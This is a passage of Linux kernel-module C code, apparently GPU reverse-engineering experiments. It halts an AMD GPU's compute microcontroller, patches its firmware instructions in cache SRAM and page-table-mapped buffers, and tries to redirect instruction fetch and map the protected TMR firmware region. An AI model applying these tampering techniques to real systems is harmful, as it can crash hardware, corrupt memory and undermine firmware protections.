						int further = (entry_val >> 6) & 1;
						u64 phys    = (entry_val >> 12) << 12;

						pr_info("fw36:   valid=%d system=%d further=%d phys=0x%llX\n",
							valid, system, further, phys);

						if (!valid) {
							pr_info("fw36:   PTE INVALID — walk stops\n");
							walk_ok = 0;
						} else if (level > 0 && further) {
							/* Directory entry — follow to next level */
							current_base = phys;
							pr_info("fw36:   → next level base = 0x%llX\n", phys);
						} else {
							/* Leaf PTE — final physical address */
							u64 page_off = va & ((1ULL << shift_bits[level]) - 1);
							u64 final_pa = phys + page_off;
							pr_info("fw36:   *** LEAF PTE: IC_BASE maps to MC 0x%llX ***\n",
								final_pa);
							pr_info("fw36:   system=%d (0=VRAM, 1=sysmem)\n", system);

							/* Check if it's in TMR, GART BO, or general VRAM */
							{
								u64 gart_bo_mc = *(u64 *)((u8 *)adev + 0x3B960);
								u64 tmr_bo_mc  = 0x97E0000000ULL;
								if (final_pa >= tmr_mc &&
								    final_pa < tmr_mc + tmr_size)
									pr_info("fw36:   → IN TMR REGION (offset 0x%llX)\n",
										final_pa - tmr_mc);
								else if (final_pa >= gart_bo_mc &&
								         final_pa < gart_bo_mc + 0x80000)
									pr_info("fw36:   → IN GART BO REGION (offset 0x%llX)\n",
										final_pa - gart_bo_mc);
								else if (final_pa >= tmr_bo_mc &&
								         final_pa < tmr_bo_mc + 0x08C00000ULL)
									pr_info("fw36:   → IN TMR BO (offset 0x%llX within 140MB TMR alloc)\n",
										final_pa - tmr_bo_mc);
								else
									pr_info("fw36:   → VRAM offset 0x%llX from FB_BASE\n",
										final_pa - 0x8000000000ULL);
							}

							/* Try to read the physical location */
							{
								u32 code_at_pa;
								if (final_pa >= tmr_mc &&
								    final_pa < tmr_mc + tmr_size) {
									u64 off = final_pa - tmr_mc;
									copy_from_kernel_nofault(&code_at_pa,
										(void *)(unsigned long)(tmr_kptr + off), 4);
									pr_info("fw36:   code at IC_BASE phys: 0x%08X\n",
										code_at_pa);
								} else {
									code_at_pa = vram_read32(final_pa);
									pr_info("fw36:   code at IC_BASE phys (VRAM): 0x%08X\n",
										code_at_pa);
								}
							}
							walk_ok = 0; /* done */
						}
					} else {
						pr_info("fw36:   PTE is zero or all-Fs — walk stops\n");
						walk_ok = 0;
					}
				}
			}
		} else {
			pr_info("fw36: PT_BASE is zero/invalid — skipping walk\n");
		}

		/* Part B: Search for IC SRAM direct-access registers.
		 * On older GFX (ME1_UCODE_ADDR/DATA), RS64 may use different regs.
		 * Scan around known CP_MEC register region for accessible SRAM ports. */
		pr_info("fw36: --- IC SRAM REGISTER SCAN ---\n");
		{
			/* Known RS64 registers from gc_12_0_0_offset.h:
			 * regCP_MEC_RS64_CNTL, regCP_MEC_RS64_INSTR_PNTR, etc.
			 * Look for UCODE_ADDR/DATA equivalents near MEC registers.
			 * CP_MEC registers are around gc_base0+0x2800-0x2900 range. */
			u32 scan_ranges[][2] = {
				{0x2800, 0x2900},  /* CP_MEC region */
				{0x3400, 0x3500},  /* CP_MEC scratch/extended */
				{0x1180, 0x1200},  /* CP_ME region (for reference) */
				{0x11C0, 0x11E0},  /* CP_CE region */
			};
			int r, reg;

			for (r = 0; r < 4; r++) {
				pr_info("fw36: Scanning 0x%04X-0x%04X:\n",
					scan_ranges[r][0], scan_ranges[r][1]);
				for (reg = scan_ranges[r][0]; reg < scan_ranges[r][1]; reg++) {
					u32 val = rr(gc_base0 + reg);
					if (val != 0 && val != 0xFFFFFFFF)
						pr_info("fw36:   [0x%04X] = 0x%08X\n", reg, val);
				}
			}
		}

		/* Part C: Try GART BO patch + TLB invalidation via correct GFX12 regs.
		 * Use GCVM_INVALIDATE_ENG0 at gc_base0+0x1647. */
		pr_info("fw36: --- GART BO PATCH + TLB INVALIDATE ---\n");
		{
			u64 gart_cpu = *(u64 *)((u8 *)adev + 0x3B968);
			u64 gart_mc  = *(u64 *)((u8 *)adev + 0x3B960);
			u32 pc4a7_off = 0x329C;
			u32 orig_instr, new_instr, readback;
			u32 rs64_cntl, ic_op;

			if (!gart_cpu || gart_cpu == 0xFFFFFFFFFFFFFFFFULL) {
				pr_info("fw36: GART BO CPU ptr invalid, skipping\n");
				goto phase19_done;
			}

			/* Read original instruction at PC=0x4A7 */
			copy_from_kernel_nofault(&orig_instr,
				(void *)(unsigned long)(gart_cpu + pc4a7_off), 4);
			pr_info("fw36: GART BO PC=0x4A7 original: 0x%08X\n", orig_instr);

			if (orig_instr == 0 || orig_instr == 0xFFFFFFFF) {
				pr_info("fw36: Bad readback, skipping\n");
				goto phase19_done;
			}

			/* Write distinctive NOP sled: ADDI x0,x0,0x123 = 0x12300013 */
			new_instr = 0x12300013;
			copy_to_kernel_nofault(
				(void *)(unsigned long)(gart_cpu + pc4a7_off),
				&new_instr, 4);
			udelay(200);
			copy_from_kernel_nofault(&readback,
				(void *)(unsigned long)(gart_cpu + pc4a7_off), 4);
			pr_info("fw36: Wrote 0x%08X, readback 0x%08X %s\n",
				new_instr, readback,
				readback == new_instr ? "OK" : "FAIL");

			if (readback != new_instr)
				goto phase19_restore;

			/* Step 1: Halt MEC */
			rs64_cntl = rr(regCP_MEC_RS64_CNTL);
			wr(regCP_MEC_CNTL, (1 << 30));
			wr(regCP_MEC_RS64_CNTL, rs64_cntl | (1 << 30));
			udelay(2000);
			pr_info("fw36: Halted, PC=0x%04X\n", rr(regCP_MEC1_INSTR_PNTR));

			/* Step 2: Invalidate IC */
			ic_op = rr(regCP_CPC_IC_OP_CNTL);
			wr(regCP_CPC_IC_OP_CNTL, ic_op | 0x1); /* invalidate */
			udelay(2000);

			/* Step 3: TLB invalidation via GCVM_INVALIDATE_ENG0
			 * Register format:
			 *   bits [3:0] = per_vmid_invalidate_req (1 << vmid)
			 *   bits [7:4] = flush_type (0=all, 1=pte, 2=range)
			 *   bit 8 = invalidate_l2_ptes
			 *   bit 9 = invalidate_l2_pde0
			 *   bit 10 = invalidate_l2_pde1
			 *   bit 11 = invalidate_l2_pde2
			 *   bit 12 = invalidate_l1_ptes
			 *   bit 13 = clear_protection_fault_status_addr
			 */
			{
				u32 inv_req;
				/* Full flush for VMID 0: all levels, all types */
				inv_req = (1 << 0)   /* VMID 0 */
				        | (0 << 4)   /* flush_type = all */
				        | (1 << 8)   /* inv l2 ptes */
				        | (1 << 9)   /* inv l2 pde0 */
				        | (1 << 10)  /* inv l2 pde1 */
				        | (1 << 11)  /* inv l2 pde2 */
				        | (1 << 12); /* inv l1 ptes */

				pr_info("fw36: TLB invalidation: writing 0x%08X to ENG0_REQ\n",
					inv_req);
				wr(gc_base0 + 0x1647, inv_req);
				udelay(5000);

				/* Check ACK */
				{
					u32 ack = rr(gc_base0 + 0x1657);  /* ENG0_ACK */
					pr_info("fw36: TLB ENG0_ACK = 0x%08X\n", ack);
				}
			}

			/* Step 4: Prime IC from (now TLB-invalidated, patched) source */
			wr(regCP_CPC_IC_OP_CNTL, ic_op | 0x2); /* prime */
			udelay(3000);
			wr(regCP_CPC_IC_OP_CNTL, ic_op);

			/* Step 5: Set PRGRM_CNTR_START to 0 (normal entry) */
			wr(regCP_MEC_RS64_PRGRM_CNTR_START, 0x800);

			/* Step 6: Pipe reset + unhalt */
			wr(regCP_MEC_RS64_CNTL, rs64_cntl | 0xF0000);
			udelay(1000);
			wr(regCP_MEC_RS64_CNTL, rs64_cntl & ~0xF0000);
			udelay(1000);

			wr(regCP_MEC_CNTL, 0);
			wr(regCP_MEC_RS64_CNTL, rs64_cntl);
			udelay(10000);

			{
				u32 new_pc = rr(regCP_MEC1_INSTR_PNTR);
				pr_info("fw36: Post TLB-inv + patch: PC=0x%04X\n", new_pc);
				if (new_pc != pc_orig)
					pr_info("fw36: *** PC CHANGED! Was 0x%04X now 0x%04X ***\n",
						pc_orig, new_pc);
			}

			/* Check scratch regs */
			{
				int s;
				for (s = 0; s < 4; s++)
					pr_info("fw36: SCRATCH_%d = 0x%08X\n",
						s, rr(gc_base0 + 0x3460 + s));
			}

			/* Check L2 fault status — did we cause a fault? */
			{
				u32 fs_lo = rr(gc_base0 + 0x15D0);
				u32 fs_hi = rr(gc_base0 + 0x15D1);
				u32 fa_lo = rr(gc_base0 + 0x15D2);
				u32 fa_hi = rr(gc_base0 + 0x15D3);
				if (fs_lo || fs_hi)
					pr_info("fw36: L2 FAULT: status=0x%08X_%08X addr=0x%08X_%08X\n",
						fs_hi, fs_lo, fa_hi, fa_lo);
				else
					pr_info("fw36: No L2 fault\n");
			}

phase19_restore:
			/* Restore original instruction */
			copy_to_kernel_nofault(
				(void *)(unsigned long)(gart_cpu + pc4a7_off),
				&orig_instr, 4);
			udelay(200);
			copy_from_kernel_nofault(&readback,
				(void *)(unsigned long)(gart_cpu + pc4a7_off), 4);
			pr_info("fw36: Restored PC=0x4A7: 0x%08X %s\n",
				readback, readback == orig_instr ? "OK" : "FAIL");

			/* Ensure MEC is unhalted */
			wr(regCP_MEC_CNTL, 0);
			wr(regCP_MEC_RS64_CNTL, rr(regCP_MEC_RS64_CNTL) & ~(1 << 30));
			udelay(5000);
			pr_info("fw36: Final PC after P19 restore = 0x%04X\n",
				rr(regCP_MEC1_INSTR_PNTR));
		}
	}
phase19_done:

	/*
	 * PHASE 20: DIRECT IC SRAM ACCESS via UCODE_ADDR/DATA
	 *
	 * regCP_MEC_ME1_UCODE_ADDR = gc_base0 + 0x581a
	 * regCP_MEC_ME1_UCODE_DATA = gc_base0 + 0x581b
	 * regCP_MEC_LOCAL_INSTR_BASE_LO/HI = gc_base0 + 0x292c/0x292d
	 */
	pr_info("fw36: ========== PHASE 20: IC SRAM DIRECT ACCESS ==========\n");
	{
		/* Part A: Address space configuration */
		u32 fb_loc_base  = rr(gc_base0 + 0x1614);
		u32 fb_loc_top   = rr(gc_base0 + 0x1615);
		u32 agp_top      = rr(gc_base0 + 0x1616);
		u32 agp_bot      = rr(gc_base0 + 0x1617);
		u32 agp_base     = rr(gc_base0 + 0x1618);
		u32 sys_ap_lo    = rr(gc_base0 + 0x1619);
		u32 sys_ap_hi    = rr(gc_base0 + 0x161a);

		pr_info("fw36: FB_LOCATION_BASE  = 0x%08X (MC 0x%llX)\n",
			fb_loc_base, (u64)fb_loc_base << 24);
		pr_info("fw36: FB_LOCATION_TOP   = 0x%08X (MC 0x%llX)\n",
			fb_loc_top, (u64)fb_loc_top << 24);
		pr_info("fw36: AGP_TOP           = 0x%08X\n", agp_top);
		pr_info("fw36: AGP_BOT           = 0x%08X\n", agp_bot);
		pr_info("fw36: AGP_BASE          = 0x%08X\n", agp_base);
		pr_info("fw36: SYS_APERTURE_LOW  = 0x%08X\n", sys_ap_lo);
		pr_info("fw36: SYS_APERTURE_HIGH = 0x%08X\n", sys_ap_hi);

		/* Part B: LOCAL_INSTR registers */
		{
			u32 li_base_lo  = rr(gc_base0 + 0x292c);
			u32 li_base_hi  = rr(gc_base0 + 0x292d);
			u32 li_mask_lo  = rr(gc_base0 + 0x292e);
			u32 li_mask_hi  = rr(gc_base0 + 0x292f);
			u32 li_aperture = rr(gc_base0 + 0x2930);

			pr_info("fw36: LOCAL_INSTR_BASE  = 0x%08X_%08X\n",
				li_base_hi, li_base_lo);
			pr_info("fw36: LOCAL_INSTR_MASK  = 0x%08X_%08X\n",
				li_mask_hi, li_mask_lo);
			pr_info("fw36: LOCAL_INSTR_APERTURE = 0x%08X\n", li_aperture);
		}

		/* Part C: Read IC SRAM via UCODE_ADDR/DATA */
		pr_info("fw36: --- IC SRAM READ via UCODE_ADDR/DATA ---\n");
		{
			u32 rs64_cntl_save = rr(regCP_MEC_RS64_CNTL);
			int ucode_readable = 0;

			/* Halt MEC for safe UCODE access */
			wr(regCP_MEC_CNTL, (1 << 30));
			wr(regCP_MEC_RS64_CNTL, rs64_cntl_save | (1 << 30));
			udelay(2000);
			pr_info("fw36: MEC halted, PC=0x%04X\n",
				rr(regCP_MEC1_INSTR_PNTR));

			/* Read current UCODE_ADDR */
			{
				u32 cur_addr = rr(gc_base0 + 0x581a);
				u32 cur_data = rr(gc_base0 + 0x581b);
				pr_info("fw36: UCODE_ADDR = 0x%08X\n", cur_addr);
				pr_info("fw36: UCODE_DATA = 0x%08X\n", cur_data);
			}

			/* Read at PC=0 */
			wr(gc_base0 + 0x581a, 0);
			udelay(100);
			{
				u32 d0 = rr(gc_base0 + 0x581b);
				u32 d1 = rr(gc_base0 + 0x581b);
				u32 d2 = rr(gc_base0 + 0x581b);
				u32 d3 = rr(gc_base0 + 0x581b);
				pr_info("fw36: UCODE[0x000] = 0x%08X (expect 0x04070663)\n", d0);
				pr_info("fw36: UCODE[0x001] = 0x%08X (expect 0x00060663)\n", d1);
				pr_info("fw36: UCODE[0x002] = 0x%08X (expect 0x6F826583)\n", d2);
				pr_info("fw36: UCODE[0x003] = 0x%08X (expect 0x3CB22023)\n", d3);
				if (d0 == 0x04070663 || d1 == 0x00060663)
					ucode_readable = 1;
			}

			/* Read at PC=0x4A7 */
			wr(gc_base0 + 0x581a, 0x4A7);
			udelay(100);
			{
				u32 d0 = rr(gc_base0 + 0x581b);
				u32 d1 = rr(gc_base0 + 0x581b);
				pr_info("fw36: UCODE[0x4A7] = 0x%08X (expect 0x00100393)\n", d0);
				pr_info("fw36: UCODE[0x4A8] = 0x%08X (expect 0x5E722823)\n", d1);
				if (d0 == 0x00100393)
					ucode_readable = 1;
			}

			/* Read at PC=0x800 */
			wr(gc_base0 + 0x581a, 0x800);
			udelay(100);
			{
				u32 d0 = rr(gc_base0 + 0x581b);
				u32 d1 = rr(gc_base0 + 0x581b);
				pr_info("fw36: UCODE[0x800] = 0x%08X (expect 0x00D67633)\n", d0);
				pr_info("fw36: UCODE[0x801] = 0x%08X (expect 0x08F61063)\n", d1);
				if (d0 == 0x00D67633)
					ucode_readable = 1;
			}

			if (!ucode_readable) {
				/* Broad scan */
				int addrs[] = {0, 1, 0x100, 0x4A7, 0x800,
				               0x1000, 0x4000, 0x10000};
				int s;
				pr_info("fw36: No match. Broad scan:\n");
				for (s = 0; s < 8; s++) {
					wr(gc_base0 + 0x581a, addrs[s]);
					udelay(50);
					pr_info("fw36:   [0x%05X] = 0x%08X\n",
						addrs[s], rr(gc_base0 + 0x581b));
				}

				/* Try with RS64_CNTL bits cleared */
				wr(regCP_MEC_RS64_CNTL, rs64_cntl_save & 0x0FFFFFFF);
				udelay(500);
				wr(gc_base0 + 0x581a, 0);
				udelay(100);
				pr_info("fw36: UCODE[0] after CNTL clear = 0x%08X\n",
					rr(gc_base0 + 0x581b));
				wr(gc_base0 + 0x581a, 0x4A7);
				udelay(100);
				pr_info("fw36: UCODE[0x4A7] after CNTL clear = 0x%08X\n",
					rr(gc_base0 + 0x581b));
				wr(regCP_MEC_RS64_CNTL, rs64_cntl_save | (1 << 30));
			}

			if (ucode_readable) {
				u32 orig_val, readback;

				pr_info("fw36: *** IC SRAM READABLE! Trying write... ***\n");

				/* Test write at safe high address */
				wr(gc_base0 + 0x581a, 0x10000);
				udelay(100);
				orig_val = rr(gc_base0 + 0x581b);
				pr_info("fw36: UCODE[0x10000] orig = 0x%08X\n", orig_val);

				wr(gc_base0 + 0x581a, 0x10000);
				udelay(100);
				wr(gc_base0 + 0x581b, 0xCAFE1337);
				udelay(200);

				wr(gc_base0 + 0x581a, 0x10000);
				udelay(100);
				readback = rr(gc_base0 + 0x581b);
				pr_info("fw36: UCODE[0x10000] written: 0x%08X %s\n",
					readback,
					readback == 0xCAFE1337 ?
					"*** IC SRAM WRITABLE! ***" :
					(readback == orig_val ?
					"WRITE REJECTED" : "UNEXPECTED"));

				if (readback == 0xCAFE1337) {
					/* Restore test word */
					wr(gc_base0 + 0x581a, 0x10000);
					udelay(100);
					wr(gc_base0 + 0x581b, orig_val);

					/* === THE REAL PATCH: PC=0x4A7 === */
					pr_info("fw36: === PATCHING IC SRAM AT PC=0x4A7 ===\n");
					{
						u32 orig_4a7, orig_4a8;

						wr(gc_base0 + 0x581a, 0x4A7);
						udelay(100);
						orig_4a7 = rr(gc_base0 + 0x581b);
						orig_4a8 = rr(gc_base0 + 0x581b);
						pr_info("fw36: orig [0x4A7]=0x%08X [0x4A8]=0x%08X\n",
							orig_4a7, orig_4a8);

						/* Write a NOP sled then JAL to 0x800 (main entry).
						 * JAL x1, offset where offset = (0x800 - 0x4A7) * 4
						 * = 0x359 * 4 = 0xD64.
						 * JAL encoding: imm[20|10:1|11|19:12] rd opcode
						 * Target offset = 0xD64 bytes = +3428
						 * JAL x0, +0xD64:
						 *   imm = 0xD64 → bits: [20]=0, [10:1]=0x6B2>>1=0x359,
						 *   Actually let's just use JAL x0, 0 (self-loop) first
						 *   to prove IC SRAM write affects execution */
						wr(gc_base0 + 0x581a, 0x4A7);
						udelay(100);
						wr(gc_base0 + 0x581b, 0x0000006F); /* JAL x0, 0 */
						udelay(200);

						wr(gc_base0 + 0x581a, 0x4A7);
						udelay(100);
						readback = rr(gc_base0 + 0x581b);
						pr_info("fw36: UCODE[0x4A7] patched: 0x%08X %s\n",
							readback,
							readback == 0x0000006F ?
							"*** PATCHED! ***" : "FAIL");

						/* Unhalt and observe */
						wr(regCP_MEC_CNTL, 0);
						wr(regCP_MEC_RS64_CNTL, rs64_cntl_save);
						udelay(10000);

						{
							u32 new_pc = rr(regCP_MEC1_INSTR_PNTR);
							pr_info("fw36: Post-patch PC=0x%04X\n", new_pc);
							if (new_pc != 0x4A7)
								pr_info("fw36: *** PC MOVED! 0x4A7→0x%04X ***\n",
									new_pc);
						}

						/* Check scratch regs */
						{
							int s;
							for (s = 0; s < 8; s++)
								pr_info("fw36: SCRATCH_%d = 0x%08X\n",
									s, rr(gc_base0 + 0x3460 + s));
						}

						/* Restore */
						wr(regCP_MEC_CNTL, (1 << 30));
						wr(regCP_MEC_RS64_CNTL, rs64_cntl_save | (1 << 30));
						udelay(2000);

						wr(gc_base0 + 0x581a, 0x4A7);
						udelay(100);
						wr(gc_base0 + 0x581b, orig_4a7);
						udelay(100);
						wr(gc_base0 + 0x581b, orig_4a8);
						udelay(200);

						wr(gc_base0 + 0x581a, 0x4A7);
						udelay(100);
						readback = rr(gc_base0 + 0x581b);
						pr_info("fw36: Restored [0x4A7]=0x%08X %s\n",
							readback,
							readback == orig_4a7 ? "OK" : "FAIL");
					}
				}
			}

			/* Unhalt MEC */
			wr(regCP_MEC_CNTL, 0);
			wr(regCP_MEC_RS64_CNTL, rs64_cntl_save & ~(1 << 30));
			udelay(5000);
			pr_info("fw36: Final PC after P20 = 0x%04X\n",
				rr(regCP_MEC1_INSTR_PNTR));
		}
	}

	/*
	 * PHASE 21: IC_BASE REDIRECT + PCI BAR VRAM ACCESS
	 *
	 * (a) Try writing IC_BASE_LO/HI — if not HW-locked, redirect IC fetch
	 * (b) Find PCI BAR base for VRAM to access TMR BO directly
	 * (c) Find firmware in TMR BO via PCI BAR ioremap
	 * (d) If firmware found, patch in-place + force IC reload
	 */
	pr_info("fw36: ========== PHASE 21: IC_BASE REDIRECT ==========\n");
	{
		u64 ic_base_orig = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) |
		                   rr(regCP_CPC_IC_BASE_LO);
		u32 ic_lo_orig = rr(regCP_CPC_IC_BASE_LO);
		u32 ic_hi_orig = rr(regCP_CPC_IC_BASE_HI);
		u32 rs64_cntl_save = rr(regCP_MEC_RS64_CNTL);

		pr_info("fw36: IC_BASE orig = 0x%08X_%08X\n", ic_hi_orig, ic_lo_orig);

		/* Part A: Try writing IC_BASE while MEC is halted */
		wr(regCP_MEC_CNTL, (1 << 30));
		wr(regCP_MEC_RS64_CNTL, rs64_cntl_save | (1 << 30));
		udelay(2000);

		/* Write test value to IC_BASE_LO */
		wr(regCP_CPC_IC_BASE_LO, 0xDEADBEEF);
		udelay(200);
		{
			u32 rb = rr(regCP_CPC_IC_BASE_LO);
			pr_info("fw36: IC_BASE_LO write test: wrote 0xDEADBEEF, read 0x%08X %s\n",
				rb, rb == 0xDEADBEEF ? "*** WRITABLE! ***" :
				(rb == ic_lo_orig ? "HW-LOCKED" : "PARTIAL"));

			if (rb != ic_lo_orig) {
				/* RESTORE immediately */
				wr(regCP_CPC_IC_BASE_LO, ic_lo_orig);
				udelay(200);
				pr_info("fw36: Restored IC_BASE_LO = 0x%08X\n",
					rr(regCP_CPC_IC_BASE_LO));

				if (rb == 0xDEADBEEF) {
					pr_info("fw36: *** IC_BASE IS WRITABLE! ***\n");
					pr_info("fw36: This means we can redirect MEC instruction fetch!\n");
				}
			}
		}

		/* Part B: Find PCI BAR for VRAM access */
		pr_info("fw36: --- PCI BAR VRAM Access ---\n");
		{
			/* adev->gmc.aper_base and aper_size are typically in the
			 * adev structure. In amdgpu, struct amdgpu_gmc is embedded
			 * in adev at a known offset. Let's scan for the PCI BAR
			 * base address (typically 0x60XXXXXXXX or similar PCIe address).
			 *
			 * Alternative: scan adev for values that look like PCI BAR
			 * addresses (physical memory addresses, typically > 0x100000000,
			 * page-aligned, followed by VRAM size ~8GB).
			 */
			u64 aper_base = 0, aper_size = 0;
			int off;

			/* Strategy: search adev for the VRAM aperture.
			 * It's a u64 physical address followed by u64 size.
			 * Size should be 8GB = 0x200000000 or close.
			 * Base should be a large physical address. */
			for (off = 0; off < 0x80000 - 16; off += 8) {
				u64 val = *(u64 *)((u8 *)adev + off);
				u64 next = *(u64 *)((u8 *)adev + off + 8);
				/* Look for a plausible BAR address followed by plausible size */
				if (val > 0x100000000ULL && val < 0xFFF000000000ULL &&
				    (val & 0xFFFFF) == 0 &&  /* 1MB aligned */
				    next >= 0x10000000ULL &&   /* size >= 256MB */
				    next <= 0x800000000ULL &&  /* size <= 32GB */
				    (next & 0xFFFFF) == 0) {   /* size aligned */
					/* Verify: next field might be another related value */
					u64 after = *(u64 *)((u8 *)adev + off + 16);
					pr_info("fw36: Candidate BAR at adev+0x%X: base=0x%llX size=0x%llX (%.0llu MB) next=0x%llX\n",
						off, val, next, next >> 20, after);
					if (next == 0x200000000ULL || next == 0x100000000ULL) {
						aper_base = val;
						aper_size = next;
						pr_info("fw36: *** VRAM APERTURE FOUND ***\n");
					}
				}
			}

			if (aper_base && aper_size) {
				/* Map a portion of VRAM to read the TMR BO.
				 * TMR BO at MC 0x97E0000000, FB_BASE at MC 0x8000000000.
				 * VRAM offset = 0x97E0000000 - 0x8000000000 = 0x17E0000000.
				 * If aper_size >= 0x17E0000000, we can access it directly.
				 * If not, we need to use the small aperture window. */
				u64 tmr_bo_mc = 0x97E0000000ULL;
				u64 fb_base_mc = 0x8000000000ULL;
				u64 tmr_vram_off = tmr_bo_mc - fb_base_mc;

				pr_info("fw36: TMR BO at VRAM offset 0x%llX (%llu MB from VRAM start)\n",
					tmr_vram_off, tmr_vram_off >> 20);
				pr_info("fw36: Aperture size = 0x%llX (%llu MB)\n",
					aper_size, aper_size >> 20);

				if (tmr_vram_off < aper_size) {
					/* We can access TMR BO via PCI BAR! */
					void __iomem *tmr_map;
					resource_size_t phys_addr = aper_base + tmr_vram_off;
					size_t map_size = 0x100000; /* Map 1MB at a time */

					pr_info("fw36: Mapping TMR BO at phys 0x%llX\n",
						(u64)phys_addr);

					tmr_map = ioremap(phys_addr, map_size);
					if (tmr_map) {
						u32 hdr[8];
						int i;
						pr_info("fw36: *** TMR BO MAPPED via PCI BAR! ***\n");

						/* Read first 32 bytes */
						for (i = 0; i < 8; i++)
							hdr[i] = readl(tmr_map + i * 4);
						pr_info("fw36: TMR BO[0]: %08X %08X %08X %08X\n",
							hdr[0], hdr[1], hdr[2], hdr[3]);
						pr_info("fw36: TMR BO[16]: %08X %08X %08X %08X\n",
							hdr[4], hdr[5], hdr[6], hdr[7]);

						/* Search for firmware code pattern (PC=0) */
						{
							u64 scan_off;
							int found = 0;
							for (scan_off = 0; scan_off < map_size - 16 && !found; scan_off += 4) {
								u32 v = readl(tmr_map + scan_off);
								if (v == 0x04070663) { /* PC=0 first instruction */
									u32 v1 = readl(tmr_map + scan_off + 4);
									if (v1 == 0x00060663) {
										pr_info("fw36: *** FW CODE at TMR BO+0x%llX ***\n",
											scan_off);
										found = 1;
									}
								}
							}
							if (!found)
								pr_info("fw36: FW code not in first 1MB of TMR BO\n");
						}

						iounmap(tmr_map);
					} else {
						pr_info("fw36: ioremap failed for TMR BO\n");
					}
				} else {
					pr_info("fw36: TMR BO offset 0x%llX > aperture 0x%llX\n",
						tmr_vram_off, aper_size);

					/* Try small aperture access: some GPUs have a
					 * moveable VRAM window. Check adev for SMC VRAM
					 * access functions. For now, try direct BAR mapping
					 * at a smaller offset to verify BAR works at all. */
					{
						void __iomem *test_map;
						test_map = ioremap(aper_base, 0x1000);
						if (test_map) {
							u32 test_val = readl(test_map);
							pr_info("fw36: BAR+0 readl = 0x%08X (VRAM accessible)\n",
								test_val);
							iounmap(test_map);
						} else {
							pr_info("fw36: BAR ioremap failed\n");
						}
					}
				}
			} else {
				pr_info("fw36: VRAM aperture not found in adev scan\n");

				/* Fallback: read PCI BAR from config space directly */
				{
					/* Find the PCI device for amdgpu.
					 * adev->pdev is typically early in the struct. */
					struct pci_dev *pdev = NULL;
					int off2;
					for (off2 = 0; off2 < 0x1000; off2 += 8) {
						u64 val = *(u64 *)((u8 *)adev + off2);
						/* pci_dev pointers are in kernel range */
						if ((val >> 48) == 0xFFFF &&
						    val != 0xFFFFFFFFFFFFFFFFULL) {
							/* Try to validate as pci_dev by checking
							 * if it has a valid vendor/device ID */
							struct pci_dev *candidate = (void *)(unsigned long)val;
							u16 vendor = 0, device = 0;
							if (!copy_from_kernel_nofault(&vendor,
								&candidate->vendor, 2) &&
							    !copy_from_kernel_nofault(&device,
								&candidate->device, 2)) {
								if (vendor == 0x1002) { /* AMD */
									pdev = candidate;
									pr_info("fw36: Found pdev at adev+0x%X: %04X:%04X\n",
										off2, vendor, device);
									break;
								}
							}
						}
					}

					if (pdev) {
						resource_size_t bar0 = pci_resource_start(pdev, 0);
						resource_size_t bar0_len = pci_resource_len(pdev, 0);
						resource_size_t bar2 = pci_resource_start(pdev, 2);
						resource_size_t bar2_len = pci_resource_len(pdev, 2);
						pr_info("fw36: PCI BAR0: 0x%llX len 0x%llX (%llu MB)\n",
							(u64)bar0, (u64)bar0_len, (u64)bar0_len >> 20);
						pr_info("fw36: PCI BAR2: 0x%llX len 0x%llX\n",
							(u64)bar2, (u64)bar2_len);

						if (bar0_len > 0) {
							aper_base = bar0;
							aper_size = bar0_len;

							/* Check if TMR BO is within BAR range */
							{
								u64 tmr_vram_off = 0x97E0000000ULL - 0x8000000000ULL;
								pr_info("fw36: TMR BO VRAM offset = 0x%llX\n",
									tmr_vram_off);
								if (tmr_vram_off < bar0_len) {
									void __iomem *tmr_map;
									tmr_map = ioremap(bar0 + tmr_vram_off, 0x100000);
									if (tmr_map) {
										u32 v0 = readl(tmr_map);
										pr_info("fw36: *** TMR BO via BAR: [0]=0x%08X ***\n", v0);

										/* Search for firmware */
										{
											u64 s;
											int found = 0;
											for (s = 0; s < 0x100000 - 8 && !found; s += 4) {
												u32 v = readl(tmr_map + s);
												if (v == 0x04070663) {
													u32 v1 = readl(tmr_map + s + 4);
													if (v1 == 0x00060663) {
														pr_info("fw36: *** FW at TMR+0x%llX ***\n", s);
														found = 1;
													}
												}
											}
											if (!found)
												pr_info("fw36: FW not in first 1MB TMR BO via BAR\n");
										}
										iounmap(tmr_map);
									} else {
										pr_info("fw36: TMR BO ioremap via BAR failed\n");
									}
								} else {
									pr_info("fw36: TMR beyond BAR range, trying resize BAR or offset scan\n");

									/* Try accessing at offset 0 first to verify BAR works */
									{
										void __iomem *test_map = ioremap(bar0, 0x1000);
										if (test_map) {
											pr_info("fw36: BAR0[0] = 0x%08X\n",
												readl(test_map));
											iounmap(test_map);
										}
									}
								}
							}
						}
					}
				}
			}
		}

		/* Unhalt MEC */
		wr(regCP_MEC_CNTL, 0);
		wr(regCP_MEC_RS64_CNTL, rs64_cntl_save & ~(1 << 30));
		udelay(5000);
		pr_info("fw36: Final PC after P21 = 0x%04X\n",
			rr(regCP_MEC1_INSTR_PNTR));
	}

	/*
	 * PHASE 22: GART PTE MANIPULATION + IC_BASE ADDRESS ANALYSIS
	 *
	 * IC_BASE=0x20681D4000 is not in FB/GART/SYS aperture.
	 * Hypotheses:
	 *  (a) IC_BASE uses a PSP-protected direct path (not VM)
	 *  (b) IC_BASE maps through a custom aperture we haven't found
	 *
	 * Tests:
	 *  1. Read VRAM at speculative MC addresses derived from IC_BASE
	 *  2. Read the GART page table via kptr to find any IC_BASE mapping
	 *  3. Check how the driver sets IC_BASE by scanning kernel symbols
	 *  4. Try GART PTE injection to redirect IC_BASE
	 *  5. Read adev->gfx.mec fields for firmware GPU VA info
	 */
	pr_info("fw36: ========== PHASE 22: IC_BASE ADDRESS ANALYSIS ==========\n");
	{
		u64 ic_base_va = ((u64)rr(regCP_CPC_IC_BASE_HI) << 32) |
		                 rr(regCP_CPC_IC_BASE_LO);

		/* Test 1: Read VRAM at speculative MC addresses.
		 * Try IC_BASE raw as MC address: 0x20681D4000
		 * Try IC_BASE + FB_BASE: 0x8000000000 + 0x681D4000 = 0x80681D4000
		 * Try IC_BASE & FB_MASK: 0x681D4000
		 * Try the BO firmware location: 0x80007EE000 */
		pr_info("fw36: IC_BASE VA = 0x%llX\n", ic_base_va);
		{
			u64 test_addrs[] = {
				ic_base_va,
				0x8000000000ULL + (ic_base_va & 0xFFFFFFFFFFULL),
				ic_base_va & 0xFFFFFFFFFFULL,
				0x80007EE000ULL,
				0x80007EE000ULL + 0x1130, /* FW BO + PC=0x44C*4 */
			};
			const char *test_names[] = {
				"raw IC_BASE",
				"FB_BASE + IC_BASE_LO",
				"IC_BASE & 0xFFFFFFFFFF",
				"FW BO base",
				"FW BO + PC*4",
			};
			int t;
